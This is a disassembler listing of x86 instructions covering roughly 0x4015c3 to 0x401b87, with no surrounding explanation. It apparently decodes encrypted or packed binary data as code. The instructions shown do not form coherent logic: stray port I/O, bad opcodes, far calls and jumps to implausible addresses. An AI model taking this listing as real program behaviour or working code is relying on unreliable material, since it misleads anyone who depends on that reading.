  4015c3:	07                   	pop    %es
  4015c4:	e0 70                	loopne 0x401636
  4015c6:	0d 20 51 ba 46       	or     $0x46ba5120,%eax
  4015cb:	b0 e3                	mov    $0xe3,%al
  4015cd:	21 c6                	and    %eax,%esi
  4015cf:	ef                   	out    %eax,(%dx)
  4015d0:	2d 9c b3 23 9c       	sub    $0x9c23b39c,%eax
  4015d5:	93                   	xchg   %eax,%ebx
  4015d6:	5f                   	pop    %edi
  4015d7:	9e                   	sahf
  4015d8:	e1 21                	loope  0x4015fb
  4015da:	ca ef 2d             	lret   $0x2def
  4015dd:	98                   	cwtl
  4015de:	b1 23                	mov    $0x23,%cl
  4015e0:	60                   	pusha
  4015e1:	a2 3e 7e 68 3b       	mov    %al,0x3b687e3e
  4015e6:	64 3d a1 a7 6f ef    	fs cmp $0xef6fa7a1,%eax
  4015ec:	8d 35 6a 35 3e 33    	lea    0x333e356a,%esi
  4015f2:	b1 3b                	mov    $0x3b,%cl
  4015f4:	64 a3 7f 9a f0 65    	mov    %eax,%fs:0x65f09a7f
  4015fa:	f2 4b                	repnz dec %ebx
  4015fc:	d0 d6                	rcl    $1,%dh
  4015fe:	7b 66                	jnp    0x401666
  401600:	68 93 5f 9a e1       	push   $0xe19a5f93
  401605:	21 c2                	and    %eax,%edx
  401607:	ef                   	out    %eax,(%dx)
  401608:	2d 98 0b 90 83       	sub    $0x83900b98,%eax
  40160d:	42                   	inc    %edx
  40160e:	d2 1f                	rcrb   %cl,(%edi)
  401610:	00 64 3a ed          	add    %ah,-0x13(%edx,%edi,1)
  401614:	15 6c 80 b5 25       	adc    $0x25b5806c,%eax
  401619:	06                   	push   %es
  40161a:	2a 37                	sub    (%edi),%dh
  40161c:	e1 a5                	loope  0x4015c3
  40161e:	cd 8c                	int    $0x8c
  401620:	a9 9e 3d a7 91       	test   $0x91a73d9e,%eax
  401625:	7b 13                	jnp    0x40163a
  401627:	ac                   	lods   %ds:(%esi),%al
  401628:	e1 b4                	loope  0x4015de
  40162a:	63 ef                	arpl   %ebp,%edi
  40162c:	aa                   	stos   %al,%es:(%edi)
  40162d:	e7 f8                	out    %eax,$0xf8
  40162f:	07                   	pop    %es
  401630:	e0 70                	loopne 0x4016a2
  401632:	0d 20 51 ba 46       	or     $0x46ba5120,%eax
  401637:	b0 97                	mov    $0x97,%al
  401639:	61                   	popa
  40163a:	3a c7                	cmp    %bh,%al
  40163c:	2a 64 b1 23          	sub    0x23(%ecx,%esi,4),%ah
  401640:	60                   	pusha
  401641:	a2 3e 7e 68 ef       	mov    %al,0xef687e3e
  401646:	7f 9a                	jg     0x4015e2
  401648:	e1 a6                	loope  0x4015f0
  40164a:	13 a4 e1 31 c6 39 36 	adc    0x3639c631(%ecx,%eiz,8),%esp
  401651:	3f                   	aas
  401652:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401654:	3d ed df e5 84       	cmp    $0x84e5dfed,%eax
  401659:	78 69                	js     0x4016c4
  40165b:	30 3f                	xor    %bh,(%edi)
  40165d:	ef                   	out    %eax,(%dx)
  40165e:	4f                   	dec    %edi
  40165f:	76 e3                	jbe    0x401644
  401661:	39 2e                	cmp    %ebp,(%esi)
  401663:	a1 2d 98 41 51       	mov    0x5141982d,%eax
  401668:	8a 44 b1 23          	mov    0x23(%ecx,%esi,4),%al
  40166c:	94                   	xchg   %eax,%esp
  40166d:	ed                   	in     (%dx),%eax
  40166e:	7f 9e                	jg     0x40160e
  401670:	e1 21                	loope  0x401693
  401672:	ce                   	into
  401673:	91                   	xchg   %eax,%ecx
  401674:	0d 9c b3 23 98       	or     $0x9823b39c,%eax
  401679:	ed                   	in     (%dx),%eax
  40167a:	7f 9a                	jg     0x401616
  40167c:	97                   	xchg   %eax,%edi
  40167d:	61                   	popa
  40167e:	3a c7                	cmp    %bh,%al
  401680:	2a 64 b3 91          	sub    -0x6f(%ebx,%esi,4),%ah
  401684:	83 78 b1 23          	cmpl   $0x23,-0x4f(%eax)
  401688:	60                   	pusha
  401689:	6b 84 62 50 ed c0 4f 	imul   $0xffffff9a,0x4fc0ed50(%edx,%eiz,2),%eax
  401690:	9a 
  401691:	ef                   	out    %eax,(%dx)
  401692:	77 6a                	ja     0x4016fe
  401694:	67 da 2e 77 51       	fisubrl 0x5177
  401699:	b4 4e                	mov    $0x4e,%ah
  40169b:	63 59 a4             	arpl   %ebx,-0x5c(%ecx)
  40169e:	7a 8d                	jp     0x40162d
  4016a0:	73 23                	jae    0x4016c5
  4016a2:	03 b9 14 84 0b a6    	add    -0x59f47bec(%ecx),%edi
  4016a8:	83 76 b1 23          	xorl   $0x23,-0x4f(%esi)
  4016ac:	94                   	xchg   %eax,%esp
  4016ad:	ed                   	in     (%dx),%eax
  4016ae:	7f 8a                	jg     0x40163a
  4016b0:	e1 21                	loope  0x4016d3
  4016b2:	d2 91 0d 88 b3 23    	rclb   %cl,0x23b3880d(%ecx)
  4016b8:	8c ed                	mov    %gs,%ebp
  4016ba:	7f 9a                	jg     0x401656
  4016bc:	37                   	aaa
  4016bd:	3a 61 af             	cmp    -0x51(%ecx),%ah
  4016c0:	ab                   	stos   %eax,%es:(%edi)
  4016c1:	31 b3 83 39 32 6d    	xor    %esi,0x6d323983(%ebx)
  4016c7:	ed                   	in     (%dx),%eax
  4016c8:	1d 6c 85 d4 7a       	sbb    $0x7ad4856c,%eax
  4016cd:	8a 5d e7             	mov    -0x19(%ebp),%bl
  4016d0:	87 f7                	xchg   %esi,%edi
  4016d2:	2b 66 68             	sub    0x68(%esi),%esp
  4016d5:	9b                   	fwait
  4016d6:	3f                   	aas
  4016d7:	66 c9                	leavew
  4016d9:	26 3a 99 1d 68 52 98 	cmp    %es:-0x67ad97e3(%ecx),%bl
  4016e0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4016e1:	26 3a 30             	cmp    %es:(%eax),%dh
  4016e4:	80 36 c7             	xorb   $0xc7,(%esi)
  4016e7:	99                   	cltd
  4016e8:	97                   	xchg   %eax,%edi
  4016e9:	ed                   	in     (%dx),%eax
  4016ea:	7f 9a                	jg     0x401686
  4016ec:	e3 19                	jecxz  0x401707
  4016ee:	36 21 3f             	and    %edi,%ss:(%edi)
  4016f1:	0c c4                	or     $0xc4,%al
  4016f3:	aa                   	stos   %al,%es:(%edi)
  4016f4:	2a 64 6c 8e          	sub    -0x72(%esp,%ebp,2),%ah
  4016f8:	57                   	push   %edi
  4016f9:	99                   	cltd
  4016fa:	c5 99 38 ef 47 9a    	lds    -0x65b810c8(%ecx),%ebx
  401700:	2f                   	das
  401701:	33 6c 8e 8e          	xor    -0x72(%esi,%ecx,4),%ebp
  401705:	99                   	cltd
  401706:	c5 99 eb a0 1e 39    	lds    0x391ea0eb(%ecx),%ebx
  40170c:	36 ad                	lods   %ss:(%esi),%eax
  40170e:	f9                   	stc
  40170f:	33 e1                	xor    %ecx,%esp
  401711:	81 6b 35 3e 33 b1 3b 	subl   $0x3bb1333e,0x35(%ebx)
  401718:	64 db 25 7c ce 7b bb 	(bad) %fs:0xbb7bce7c
  40171f:	91                   	xchg   %eax,%ecx
  401720:	1c 6f                	sbb    $0x6f,%al
  401722:	3a 66 97             	cmp    -0x69(%esi),%ah
  401725:	11 32                	adc    %esi,(%edx)
  401727:	8e 8c 00 3a 66 e1 a2 	mov    -0x5d1e99c6(%eax,%eax,1),%cs
  40172e:	50                   	push   %eax
  40172f:	66 02 64 52 99       	data16 add -0x67(%edx,%edx,2),%ah
  401734:	77 64                	ja     0x40179a
  401736:	3a 35 3e 9b 4f 6e    	cmp    0x6e4f9b3e,%dh
  40173c:	02 64 50 66          	add    0x66(%eax,%edx,2),%ah
  401740:	80 ff 5e             	cmp    $0x5e,%bh
  401743:	66 68 a2 3e          	pushw  $0x3ea2
  401747:	55                   	push   %ebp
  401748:	68 dc 32 72 68       	push   $0x687232dc
  40174d:	64 cd 81             	fs int $0x81
  401750:	e1 21                	loope  0x401773
  401752:	c6                   	(bad)
  401753:	ef                   	out    %eax,(%dx)
  401754:	af                   	scas   %es:(%edi),%eax
  401755:	ed                   	in     (%dx),%eax
  401756:	ca 39 36             	lret   $0x3639
  401759:	3f                   	aas
  40175a:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40175c:	3d ed df 37 3b       	cmp    $0x3b37dfed,%eax
  401761:	32 6d ed             	xor    -0x13(%ebp),%ch
  401764:	1d 6c 85 54 75       	sbb    $0x7554856c,%eax
  401769:	b0 78                	mov    $0x78,%al
  40176b:	ef                   	out    %eax,(%dx)
  40176c:	90                   	nop
  40176d:	93                   	xchg   %eax,%ebx
  40176e:	dd ef                	fucomp %st(7)
  401770:	2d 98 b3 a1 eb       	sub    $0xeba1b398,%eax
  401775:	59                   	pop    %ecx
  401776:	b2 f4                	mov    $0xf4,%dl
  401778:	2a 64 3a 12          	sub    0x12(%edx,%edi,1),%ah
  40177c:	63 c5                	arpl   %eax,%ebp
  40177e:	b2 f4                	mov    $0xf4,%dl
  401780:	2a 64 6a ed          	sub    -0x13(%edx,%ebp,2),%ah
  401784:	70 9b                	jo     0x401721
  401786:	69 6e e3 22 3e 99 1e 	imul   $0x1e993e22,-0x1d(%esi),%ebp
  40178d:	60                   	pusha
  40178e:	b1 7e                	mov    $0x7e,%cl
  401790:	97                   	xchg   %eax,%edi
  401791:	37                   	aaa
  401792:	32 ed                	xor    %ch,%ch
  401794:	6e                   	outsb  %ds:(%esi),(%dx)
  401795:	9b                   	fwait
  401796:	0c ed                	or     $0xed,%al
  401798:	70 9b                	jo     0x401735
  40179a:	69 6e e9 a3 a7 3c 68 	imul   $0x683ca7a3,-0x17(%esi),%ebp
  4017a1:	64 d2 fb             	fs sar %cl,%bl
  4017a4:	09 64 3a 39          	or     %esp,0x39(%edx,%edi,1)
  4017a8:	36 3f                	ss aas
  4017aa:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4017ac:	3d ed df e5 84       	cmp    $0x84e5dfed,%eax
  4017b1:	78 69                	js     0x40181c
  4017b3:	30 3f                	xor    %bh,(%edi)
  4017b5:	ef                   	out    %eax,(%dx)
  4017b6:	4f                   	dec    %edi
  4017b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4017b8:	d7                   	xlat   %ds:(%ebx)
  4017b9:	74 16                	je     0x4017d1
  4017bb:	78 62                	js     0x40181f
  4017bd:	e5 fd                	in     $0xfd,%eax
  4017bf:	4e                   	dec    %esi
  4017c0:	44                   	inc    %esp
  4017c1:	64 3a e5             	fs cmp %ch,%ah
  4017c4:	4e                   	dec    %esi
  4017c5:	64 b9 00 6c 64 50    	fs mov $0x50646c00,%ecx
  4017cb:	66 80 03 5b          	data16 addb $0x5b,(%ebx)
  4017cf:	66 68 e9 7f          	pushw  $0x7fe9
  4017d3:	96                   	xchg   %eax,%esi
  4017d4:	38 0c 8a             	cmp    %cl,(%edx,%ecx,4)
  4017d7:	aa                   	stos   %al,%es:(%edi)
  4017d8:	2a 64 d2 2b          	sub    0x2b(%edx,%edx,8),%ah
  4017dc:	09 64 3a ef          	or     %esp,-0x11(%edx,%edi,1)
  4017e0:	ab                   	stos   %eax,%es:(%edi)
  4017e1:	e5 cd                	in     $0xcd,%eax
  4017e3:	75 39                	jne    0x40181e
  4017e5:	64 3a 57 a8          	cmp    %fs:-0x58(%edi),%dl
  4017e9:	6d                   	insl   (%dx),%es:(%edi)
  4017ea:	e1 69                	loope  0x401855
  4017ec:	f4                   	hlt
  4017ed:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4017ee:	b3 23                	mov    $0x23,%bl
  4017f0:	84 6d fa             	test   %ch,-0x6(%ebp)
  4017f3:	13 3e                	adc    (%esi),%edi
  4017f5:	32 52 36             	xor    0x36(%edx),%dl
  4017f8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4017f9:	26 3a 0c 6c          	cmp    %es:(%esp,%ebp,2),%cl
  4017fd:	0e                   	push   %cs
  4017fe:	3a eb                	cmp    %bl,%ch
  401800:	2d 94 6a 8e 70       	sub    $0x708e6a94,%eax
  401805:	05 3a 66 e1 a7       	add    $0xa7e1663a,%eax
  40180a:	0b a6 61 bf 35 fa    	or     -0x5ca409f(%esi),%esp
  401810:	a8 ed                	test   $0xed,%al
  401812:	7f 8e                	jg     0x4017a2
  401814:	61                   	popa
  401815:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401816:	4f                   	dec    %edi
  401817:	55                   	push   %ebp
  401818:	e1 94                	loope  0x4017ae
  40181a:	b9 a6 6c 34 52       	mov    $0x52346ca6,%ecx
  40181f:	26 a5                	movsl  %es:(%esi),%es:(%edi)
  401821:	26 3a ed             	es cmp %ch,%ch
  401824:	6e                   	outsb  %ds:(%esi),(%dx)
  401825:	9b                   	fwait
  401826:	0c ed                	or     $0xed,%al
  401828:	78 9b                	js     0x4017c5
  40182a:	2e 73 68             	jae,pn 0x401895
  40182d:	64 3a 66 e1          	cmp    %fs:-0x1f(%esi),%ah
  401831:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  401832:	bb 91 71 10 3a       	mov    $0x3a107191,%ebx
  401837:	66 59                	pop    %cx
  401839:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40183a:	33 bd 67 f8 fa ef    	xor    -0x10050799(%ebp),%edi
  401840:	2d 80 33 a6 1d       	sub    $0x1da63380,%eax
  401845:	61                   	popa
  401846:	0b a6 28 8f 35 e7    	or     -0x18ca70d8(%esi),%esp
  40184c:	87 db                	xchg   %ebx,%ebx
  40184e:	41                   	inc    %ecx
  40184f:	66 68 32 d2          	pushw  $0xd232
  401853:	63 97 9b c5 3f 59    	arpl   %edx,0x593fc59b(%edi)
  401859:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40185a:	65 38 33             	cmp    %dh,%gs:(%ebx)
  40185d:	ad                   	lods   %ds:(%esi),%eax
  40185e:	f9                   	stc
  40185f:	33 e1                	xor    %ecx,%esp
  401861:	81 82 52 68 65 3a 8e 	addl   $0x3a05108e,0x3a656852(%edx)
  401868:	10 05 3a 
  40186b:	66 3b 32             	cmp    (%edx),%si
  40186e:	6d                   	insl   (%dx),%es:(%edi)
  40186f:	dd 04 2b             	fldl   (%ebx,%ebp,1)
  401872:	b0 34                	mov    $0x34,%al
  401874:	e9 8f 70 52 68       	jmp    0x68928908
  401879:	64 bb 5b 60 c5 78    	fs mov $0x78c5605b,%ebx
  40187f:	66 97                	xchg   %ax,%di
  401881:	9b                   	fwait
  401882:	3a 66 1c             	cmp    0x1c(%esi),%ah
  401885:	63 b9 43 6c c5 78    	arpl   %edi,0x78c56c43(%ecx)
  40188b:	66 68 c5 3e          	pushw  $0x3ec5
  40188f:	c7                   	(bad)
  401890:	2a 64 03 23          	sub    0x23(%ebx,%eax,1),%ah
  401894:	64 6b be b0 69 64 3a 	imul   $0xffffffed,%fs:0x3a6469b0(%esi),%edi
  40189b:	ed 
  40189c:	2d 68 99 62 c9       	sub    $0xc9629968,%eax
  4018a1:	26 3a de             	es cmp %dh,%bl
  4018a4:	ef                   	out    %eax,(%dx)
  4018a5:	3d 3a 66 9f 87       	cmp    $0x879f663a,%eax
  4018aa:	b3 e3                	mov    $0xe3,%bl
  4018ac:	b0 9b                	mov    $0x9b,%al
  4018ae:	c4 99 e1 a7 b9 5b    	les    0x5bb9a7e1(%ecx),%ebx
  4018b4:	e0 f6                	loopne 0x4018ac
  4018b6:	78 66                	js     0x40191e
  4018b8:	68 10 22 c7 e0       	push   $0xe0c72210
  4018bd:	f6 78 66             	idivb  0x66(%eax)
  4018c0:	38 ef                	cmp    %ch,%bh
  4018c2:	0a 99 3e 6c b9 43    	or     0x43b96c3e(%ecx),%bl
  4018c8:	e0 f6                	loopne 0x4018c0
  4018ca:	78 66                	js     0x401932
  4018cc:	68 e5 c9 bb 7d       	push   $0x7dbbc9e5
  4018d1:	64 3a 0e             	cmp    %fs:(%esi),%cl
  4018d4:	97                   	xchg   %eax,%edi
  4018d5:	9b                   	fwait
  4018d6:	3a 66 e5             	cmp    -0x1b(%esi),%ah
  4018d9:	e1 db                	loope  0x4018b6
  4018db:	99                   	cltd
  4018dc:	96                   	xchg   %eax,%esi
  4018dd:	9b                   	fwait
  4018de:	6a 99                	push   $0xffffff99
  4018e0:	1d 68 d2 2b 0b       	sbb    $0xb2bd268,%eax
  4018e5:	64 3a 0c 69          	cmp    %fs:(%ecx,%ebp,2),%cl
  4018e9:	0c ae                	or     $0xae,%al
  4018eb:	aa                   	stos   %al,%es:(%edi)
  4018ec:	2a 64 b7 e3          	sub    -0x1d(%edi,%esi,4),%ah
  4018f0:	89 9b c4 99 38 8c    	mov    %ebx,-0x73c7663c(%ebx)
  4018f6:	7b 9d                	jnp    0x401895
  4018f8:	97                   	xchg   %eax,%edi
  4018f9:	9b                   	fwait
  4018fa:	b9 a2 64 59 c5       	mov    $0xc55964a2,%ecx
  4018ff:	99                   	cltd
  401900:	68 64 4f 6a eb       	push   $0xeb6a4f64
  401905:	41                   	inc    %ecx
  401906:	b2 f4                	mov    $0xf4,%dl
  401908:	2a 64 3a 8f          	sub    -0x71(%edx,%edi,1),%ah
  40190c:	09 65 3a             	or     %esp,0x3a(%ebp)
  40190f:	66 e1 bc             	data16 loope 0x4018ce
  401912:	0b be e1 a7 0b be    	or     -0x41f4581f(%esi),%edi
  401918:	e1 a7                	loope  0x4018c1
  40191a:	b7 23                	mov    $0x23,%bh
  40191c:	9c                   	pushf
  40191d:	34 b1                	xor    $0xb1,%al
  40191f:	23 60 ef             	and    -0x11(%eax),%esp
  401922:	7a 62                	jp     0x401986
  401924:	38 ef                	cmp    %ch,%bh
  401926:	02 99 3f 78 b3 23    	add    0x23b3783f(%ecx),%bl
  40192c:	94                   	xchg   %eax,%esp
  40192d:	e7 47                	out    %eax,$0x47
  40192f:	92                   	xchg   %eax,%edx
  401930:	68 6b be 5c 69       	push   $0x695cbe6b
  401935:	64 3a e5             	fs cmp %ch,%ah
  401938:	15 98 3a 69 ed       	adc    $0xed693a98,%eax
  40193d:	54                   	push   %esp
  40193e:	3b 66 68             	cmp    0x68(%esi),%esp
  401941:	e7 5f                	out    %eax,$0x5f
  401943:	9e                   	sahf
  401944:	68 e5 07 6e c9       	push   $0xc96e07e5
  401949:	26 3a 99 97 64 3a 12 	cmp    %es:0x123a6497(%ecx),%bl
  401950:	44                   	inc    %esp
  401951:	ed                   	in     (%dx),%eax
  401952:	e2 91                	loop   0x4018e5
  401954:	8b ed                	mov    %ebp,%ebp
  401956:	bf b2 97 9a c5       	mov    $0xc59a97b2,%edi
  40195b:	ef                   	out    %eax,(%dx)
  40195c:	ab                   	stos   %eax,%es:(%edi)
  40195d:	9b                   	fwait
  40195e:	3f                   	aas
  40195f:	6e                   	outsb  %ds:(%esi),(%dx)
  401960:	c9                   	leave
  401961:	26 3a ed             	es cmp %ch,%ch
  401964:	2d 90 03 63 60       	sub    $0x60630390,%eax
  401969:	c5 78 66             	lds    0x66(%eax),%edi
  40196c:	1e                   	push   %ds
  40196d:	63 b9 43 60 c5 78    	arpl   %edi,0x78c56043(%ecx)
  401973:	66 68 c5 32          	pushw  $0x32c5
  401977:	c7                   	(bad)
  401978:	2a 64 b3 23          	sub    0x23(%ebx,%esi,4),%ah
  40197c:	90                   	nop
  40197d:	e5 c9                	in     $0xc9,%eax
  40197f:	71 6f                	jno    0x4019f0
  401981:	64 3a 0c 68          	cmp    %fs:(%eax,%ebp,2),%cl
  401985:	8c 98 02 68 64 63    	mov    %ds,0x63646802(%eax)
  40198b:	00 af 21 da 64 68    	add    %ch,0x6864da21(%edi)
  401991:	dc 32                	fdivl  (%edx)
  401993:	76 68                	jbe    0x4019fd
  401995:	64 cd 85             	fs int $0x85
  401998:	e1 e1                	loope  0x40197b
  40199a:	ee                   	out    %al,(%dx)
  40199b:	99                   	cltd
  40199c:	96                   	xchg   %eax,%esi
  40199d:	9b                   	fwait
  40199e:	b3 a5                	mov    $0xa5,%bl
  4019a0:	e3 21                	jecxz  0x4019c3
  4019a2:	c2 ef 2d             	ret    $0x2def
  4019a5:	8c 99 6e c9 26 3a    	mov    %ds,0x3a26c96e(%ecx)
  4019ab:	eb 2d                	jmp    0x4019da
  4019ad:	94                   	xchg   %eax,%esp
  4019ae:	6a eb                	push   $0xffffffeb
  4019b0:	1d 84 b9 8a 78       	sbb    $0x788ab984,%eax
  4019b5:	ed                   	in     (%dx),%eax
  4019b6:	dd df                	fstp   %st(7)
  4019b8:	6c                   	insb   (%dx),%es:(%edi)
  4019b9:	64 3a 66 9b          	cmp    %fs:-0x65(%esi),%ah
  4019bd:	c1 b1 1b 60 ef 45 62 	shll   $0x62,0x45ef601b(%ecx)
  4019c4:	3f                   	aas
  4019c5:	ef                   	out    %eax,(%dx)
  4019c6:	05 99 3f 44 b3       	add    $0xb3443f99,%eax
  4019cb:	23 94 e5 d1 9d 3c 64 	and    0x643c9dd1(%ebp,%eiz,8),%edx
  4019d2:	3a 6f a8             	cmp    -0x58(%edi),%ch
  4019d5:	11 61 0e             	adc    %esp,0xe(%ecx)
  4019d8:	e0 f6                	loopne 0x4019d0
  4019da:	78 66                	js     0x401a42
  4019dc:	00 04 f7             	add    %al,(%edi,%esi,8)
  4019df:	24 68                	and    $0x68,%al
  4019e1:	ef                   	out    %eax,(%dx)
  4019e2:	7f 96                	jg     0x40197a
  4019e4:	38 ef                	cmp    %ch,%bh
  4019e6:	02 99 7c 59 3a 66    	add    0x663a597c(%ecx),%bl
  4019ec:	68 64 b3 23 94       	push   $0x9423b364
  4019f1:	6d                   	insl   (%dx),%es:(%edi)
  4019f2:	fa                   	cli
  4019f3:	13 55 ed             	adc    -0x13(%ebp),%edx
  4019f6:	e2 91                	loop   0x401989
  4019f8:	8b ed                	mov    %ebp,%ebp
  4019fa:	bf b6 97 9a c5       	mov    $0xc59a97b6,%edi
  4019ff:	ef                   	out    %eax,(%dx)
  401a00:	ab                   	stos   %eax,%es:(%edi)
  401a01:	e9 bf ba 97 9a       	jmp    0x9ad7d4c5
  401a06:	c5 36                	lds    (%esi),%esi
  401a08:	c9                   	leave
  401a09:	ec                   	in     (%dx),%al
  401a0a:	a8 24                	test   $0x24,%al
  401a0c:	68 34 b1 5e 97       	push   $0x975eb134
  401a11:	f3 ae                	repz scas %es:(%edi),%al
  401a13:	66 68 64 b3          	pushw  $0xb364
  401a17:	23 94 6d fa 13 7d a3 	and    -0x5c82ec06(%ebp,%ebp,2),%edx
  401a1e:	3f                   	aas
  401a1f:	6e                   	outsb  %ds:(%esi),(%dx)
  401a20:	c9                   	leave
  401a21:	26 3a 99 97 64 3a ed 	cmp    %es:-0x12c59b69(%ecx),%bl
  401a28:	2d 68 03 e3 b4       	sub    $0xb4e30368,%eax
  401a2d:	9b                   	fwait
  401a2e:	c4 99 1c 5b b3 be    	les    -0x414ca4e4(%ecx),%ebx
  401a34:	59                   	pop    %ecx
  401a35:	bc b3 a5 eb 59       	mov    $0x59eba5b3,%esp
  401a3a:	b2 f4                	mov    $0xf4,%dl
  401a3c:	2a 64 3a 12          	sub    0x12(%edx,%edi,1),%ah
  401a40:	63 c5                	arpl   %eax,%ebp
  401a42:	b2 f4                	mov    $0xf4,%dl
  401a44:	2a 64 6a ed          	sub    -0x13(%edx,%ebp,2),%ah
  401a48:	58                   	pop    %eax
  401a49:	9b                   	fwait
  401a4a:	6c                   	insb   (%dx),%es:(%edi)
  401a4b:	6e                   	outsb  %ds:(%esi),(%dx)
  401a4c:	97                   	xchg   %eax,%edi
  401a4d:	21 c2                	and    %eax,%edx
  401a4f:	ed                   	in     (%dx),%eax
  401a50:	2d 90 03 23 90       	sub    $0x90230390,%eax
  401a55:	6b b8 44 97 9b c5 e5 	imul   $0xffffffe5,-0x3a6468bc(%eax),%edi
  401a5c:	4d                   	dec    %ebp
  401a5d:	ec                   	in     (%dx),%al
  401a5e:	a8 24                	test   $0x24,%al
  401a60:	68 64 82 9c 2e       	push   $0x2e9c8264
  401a65:	64 3a 91 8b ed bf aa 	cmp    %fs:-0x55401275(%ecx),%dl
  401a6c:	97                   	xchg   %eax,%edi
  401a6d:	9a c5 ef ab 3b 64 3d 	lcall  $0x3d64,$0x3babefc5
  401a74:	a1 a7 6f ef 8d       	mov    0x8def6fa7,%eax
  401a79:	e7 d6                	out    %eax,$0xd6
  401a7b:	72 3b                	jb     0x401ab8
  401a7d:	32 6d d9             	xor    -0x27(%ebp),%ch
  401a80:	3d 3d 8d 37 d0       	cmp    $0xd0378d3d,%eax
  401a85:	6a 1b                	push   $0x1b
  401a87:	66 68 93 dd          	pushw  $0xdd93
  401a8b:	ef                   	out    %eax,(%dx)
  401a8c:	2d 9c b3 a1 59       	sub    $0x59a1b39c,%eax
  401a91:	92                   	xchg   %eax,%edx
  401a92:	b3 95                	mov    $0x95,%bl
  401a94:	d0 8d 30 66 68 93    	rorb   $1,-0x6c9799d0(%ebp)
  401a9a:	dd ef                	fucomp %st(7)
  401a9c:	2d 90 b3 a1 eb       	sub    $0xeba1b390,%eax
  401aa1:	01 c6                	add    %eax,%esi
  401aa3:	66 e3 21             	data16 jecxz 0x401ac7
  401aa6:	32 e6                	xor    %dh,%ah
  401aa8:	54                   	push   %esp
  401aa9:	54                   	push   %esp
  401aaa:	3e 69 ed f8 3a 66 68 	ds imul $0x68663af8,%ebp,%ebp
  401ab1:	6d                   	insl   (%dx),%es:(%edi)
  401ab2:	e1 13                	loope  0x401ac7
  401ab4:	7c a3                	jl     0x401a59
  401ab6:	7f 9a                	jg     0x401a52
  401ab8:	69 64 3a 66 e1 97 bb 	imul   $0xa1bb97e1,0x66(%edx,%edi,1),%esp
  401abf:	a1 
  401ac0:	8c 2c 3a             	mov    %gs,(%edx,%edi,1)
  401ac3:	66 81 e0 3a 66       	and    $0x663a,%ax
  401ac8:	68 ed ca 4f b0       	push   $0xb04fcaed
  401acd:	2c b9                	sub    $0xb9,%al
  401acf:	9e                   	sahf
  401ad0:	78 11                	js     0x401ae3
  401ad2:	56                   	push   %esi
  401ad3:	ed                   	in     (%dx),%eax
  401ad4:	2d 6c b0 22 6b       	sub    $0x6b22b06c,%eax
  401ad9:	65 06                	gs push %es
  401adb:	52                   	push   %edx
  401adc:	1c 6c                	sbb    $0x6c,%al
  401ade:	06                   	push   %es
  401adf:	53                   	push   %ebx
  401ae0:	1c 60                	sbb    $0x60,%al
  401ae2:	b9 03 94 64 b1       	mov    $0xb1649403,%ecx
  401ae7:	23 60 e9             	and    -0x17(%eax),%esp
  401aea:	7e 65                	jle    0x401b51
  401aec:	69 34 52 e6 f9 26 3a 	imul   $0x3a26f9e6,(%edx,%edx,2),%esi
  401af3:	8e c4                	mov    %esp,%es
  401af5:	07                   	pop    %es
  401af6:	3a 66 eb             	cmp    -0x15(%esi),%ah
  401af9:	a0 32 de 94 63       	mov    0x6394de32,%al
  401afe:	3a 66 9f             	cmp    -0x61(%esi),%ah
  401b01:	83 b3 23 98 ed fd a0 	xorl   $0xffffffa0,-0x21267dd(%ebx)
  401b08:	6d                   	insl   (%dx),%es:(%edi)
  401b09:	f4                   	hlt
  401b0a:	ab                   	stos   %eax,%es:(%edi)
  401b0b:	24 68                	and    $0x68,%al
  401b0d:	64 d2 ef             	fs shr %cl,%bh
  401b10:	9f                   	lahf
  401b11:	9b                   	fwait
  401b12:	c5 6f a8             	lds    -0x58(%edi),%ebp
  401b15:	10 30                	adc    %dh,(%eax)
  401b17:	e5 0d                	in     $0xd,%eax
  401b19:	98                   	cwtl
  401b1a:	3a ef                	cmp    %bh,%ch
  401b1c:	90                   	nop
  401b1d:	4d                   	dec    %ebp
  401b1e:	c2 ef af             	ret    $0xafef
  401b21:	e7 47                	out    %eax,$0x47
  401b23:	9a 68 10 60 c7 2c eb 	lcall  $0xeb2c,$0xc7601068
  401b2a:	78 66                	js     0x401b92
  401b2c:	cb                   	lret
  401b2d:	9c                   	pushf
  401b2e:	9a 24 68 8f 74 de af 	lcall  $0xafde,$0x748f6824
  401b35:	15 3a 66 9f 83       	adc    $0x839f663a,%eax
  401b3a:	b3 23                	mov    $0x23,%bl
  401b3c:	84 ed                	test   %ch,%ch
  401b3e:	fd                   	std
  401b3f:	e5 0d                	in     $0xd,%eax
  401b41:	98                   	cwtl
  401b42:	3a 57 b3             	cmp    -0x4d(%edi),%dl
  401b45:	e5 fd                	in     $0xfd,%eax
  401b47:	28 78 64             	sub    %bh,0x64(%eax)
  401b4a:	3a 8d 74 6d e1 12    	cmp    0x12e16d74(%ebp),%cl
  401b50:	6c                   	insb   (%dx),%es:(%edi)
  401b51:	5d                   	pop    %ebp
  401b52:	c9                   	leave
  401b53:	13 6a 8f             	adc    -0x71(%edx),%ebp
  401b56:	28 ed                	sub    %ch,%ch
  401b58:	2d 6c b0 62 58       	sub    $0x5862b06c,%eax
  401b5d:	58                   	pop    %eax
  401b5e:	03 19                	add    (%ecx),%ebx
  401b60:	6c                   	insb   (%dx),%es:(%edi)
  401b61:	58                   	pop    %eax
  401b62:	0a 1b                	or     (%ebx),%bl
  401b64:	6c                   	insb   (%dx),%es:(%edi)
  401b65:	e7 5f                	out    %eax,$0x5f
  401b67:	9a 68 ed c2 57 90 ed 	lcall  $0xed90,$0x57c2ed68
  401b6e:	fd                   	std
  401b6f:	20 e3                	and    %ah,%bl
  401b71:	21 32                	and    %esi,(%edx)
  401b73:	e6 54                	out    %al,$0x54
  401b75:	54                   	push   %esp
  401b76:	3a 69 ed             	cmp    -0x13(%ecx),%ch
  401b79:	43                   	inc    %ebx
  401b7a:	c5 99 97 e7 5f 9a    	lds    -0x65a01869(%ecx),%ebx
  401b80:	68 e7 47 9a 68       	push   $0x689a47e7
  401b85:	10 37                	adc    %dh,(%edi)
  401b87:	99                   	cltd
